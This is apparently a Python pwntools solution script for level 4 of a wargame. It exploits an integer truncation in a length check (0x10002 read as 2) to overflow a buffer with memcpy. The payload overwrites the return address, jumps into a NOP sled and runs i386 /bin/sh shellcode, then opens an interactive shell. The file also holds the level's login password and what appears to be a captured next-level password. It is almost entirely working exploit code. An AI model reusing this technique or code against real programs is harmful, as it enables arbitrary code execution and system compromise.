from lib.exploit import *
import time


gdb_script = '''
set disassembly-flavor intel   
alias gil = disassemble
set follow-fork-mode child

unset env
show env


# atoi
b *0x0804845d

# memcpy
b *0x08048491

r `cat amount_to_copy` `cat payload`

'''

LEVEL = "4"

# s = connect_to_local(LEVEL, "oogieleoga", remote=False)
s = connect(LEVEL, "oogieleoga")
from lib.exploit import *


# amount_to_copy = 0x10002
# short reads:  0002
# memcpy reads 10002
# the first bit of 32 must be 0 

log.info("############################################################################################################################################################")
log.info("# FIND OFF UNTIL RET")
log.info("############################################################################################################################################################")

# 65538 = enough to overwrite ret adr
amount_to_copy = 0x10002
alpha = cyclic_gen(alphabet=string.ascii_uppercase)
alpha.get(amount_to_copy)
pos, chunk, index = alpha.find(hex_to_rev_ascii(0x505a414a))
padding = bytes(alpha.get(amount_to_copy)[:pos], "utf-8")

log.info("############################################################################################################################################################")
log.info("# overwrite ret adr and ret into own overflow")
log.info("############################################################################################################################################################")

# one word behind ret adr
target_adr = 0xfffede38+50

payload = b""
payload += padding
payload += pack(target_adr, 32)
payload += b"\x90"*100
payload += asm(pwnlib.shellcraft.i386.sh())
payload = pad(payload, amount_to_copy)

s.process(["mkdir", CWD])
upload(s, payload, CWD + "payload")
upload(s, bytes(str(amount_to_copy), "utf-8"), CWD+"amount_to_copy")
upload(s, gdb_script, CWD + "gdb.script")


io = s.process(["env", "-i", BINARY_PATH, str(amount_to_copy), payload])
io.interactive()

# woucaejiek
